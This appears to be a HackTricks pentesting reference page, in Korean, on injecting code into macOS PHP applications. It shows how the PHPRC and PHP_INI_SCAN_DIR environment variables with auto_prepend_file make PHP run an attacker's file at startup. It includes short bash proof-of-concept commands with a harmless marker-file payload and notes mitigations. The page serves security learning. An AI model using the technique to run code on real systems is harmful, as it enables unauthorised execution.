# macOS PHP Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## `PHPRC` / `PHP_INI_SCAN_DIR` 및 `auto_prepend_file`

PHP CLI와 CGI는 호출될 때마다 configuration을 읽습니다. `PHPRC`를 사용하면 attacker가 읽을 수 있는 `php.ini`를 선택할 수 있고, `PHP_INI_SCAN_DIR`를 사용하면 추가 `.ini` 파일을 검색하는 directory를 redirect할 수 있습니다. `auto_prepend_file` directive는 요청된 script보다 먼저 파일을 parse하도록 PHP에 지시하므로, 이 조합은 startup code execution으로 이어집니다.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
cat >/tmp/php-payload.php <<'PHP'
<?php file_put_contents('/tmp/php-prepend-executed', 'ok'); ?>
PHP
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/attacker-php.ini

PHPRC=/tmp/attacker-php.ini php victim.php
```
대안은 `.ini` 파일을 포함하는 디렉터리입니다:
```bash
mkdir -p /tmp/php-conf.d
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/php-conf.d/99-prepend.ini
PHP_INI_SCAN_DIR=/tmp/php-conf.d php victim.php
```
`-n` 옵션은 `php.ini`를 무시하며, 명시적으로 지정한 신뢰할 수 있는 `-c` 경로가 `PHPRC`보다 우선합니다. 장시간 실행되는 server SAPI는 일반적으로 웹 서버가 시작될 때 configuration을 읽는 반면, CLI와 CGI는 각 invocation마다 configuration을 읽는다는 점을 기억하세요.<sup>[[1]](#references)</sup>

## References

- [1] [PHP configuration file](https://www.php.net/manual/en/configuration.file.php)
- [2] [PHP `auto_prepend_file`](https://www.php.net/manual/en/ini.core.php#ini.auto-prepend-file)
{{#include ../../../banners/hacktricks-training.md}}
